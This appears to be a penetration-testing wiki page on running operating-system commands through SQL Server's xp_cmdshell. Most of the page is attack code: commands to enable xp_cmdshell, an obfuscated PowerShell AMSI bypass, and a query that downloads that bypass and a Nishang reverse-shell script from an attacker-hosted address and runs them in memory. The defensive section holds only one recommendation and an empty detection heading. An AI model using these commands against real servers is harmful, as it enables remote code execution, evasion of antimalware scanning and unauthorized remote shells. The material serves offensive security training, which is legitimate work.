---
description: xp_cmdshell could be used to execute commands on the SQL Server.
---

# Executing Commands

## Attacking

### How it works

[xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) is a SQL Server functionality that is disabled by default. However it can be enabled using sp\_configure. It spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. The Windows process spawned by **** xp\_cmdshell has the same security rights as the SQL Server service account.

### Executing the attack

**In this example and screenshots mssql-cli is used, but this also works with Heidisql in the query tab.**

1. Enable xp\_cmdshell with the following commands:

```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![](<../../../.gitbook/assets/image (69).png>)

2\. Execute commands with xp\_cmdshell:

```
EXEC master..xp_cmdshell 'whoami'
```

![](<../../../.gitbook/assets/image (60) (1).png>)

3\. Gain a reverse shell and execute commands by executing the following query after doing the following:

* Create a webserver directory to host some files.
* Download [Invoke-PowerShellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
* Save a amsi bypass in amsi.txt, for example.

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/amsi.txt''); iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/Invoke-PowerShellTcp2.ps1'')"'
```

This query will download and load into memory the `amsi.txt` file and then the `Invoke-PowerShellTcp` script creating a reverse shell. These should be hosted on your webserver on the attacking machine. For more information about this technique check out:

{% content-ref url="../../misc/reverse-shell-trick.md" %}
[reverse-shell-trick.md](../../misc/reverse-shell-trick.md)
{% endcontent-ref %}

![](<../../../.gitbook/assets/image (45) (1).png>)

## Defending

### Recommendations

* Sysadmin users can enable xp\_cmdshell, so limit these users.

### Detection



## References

{% embed url="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" %}
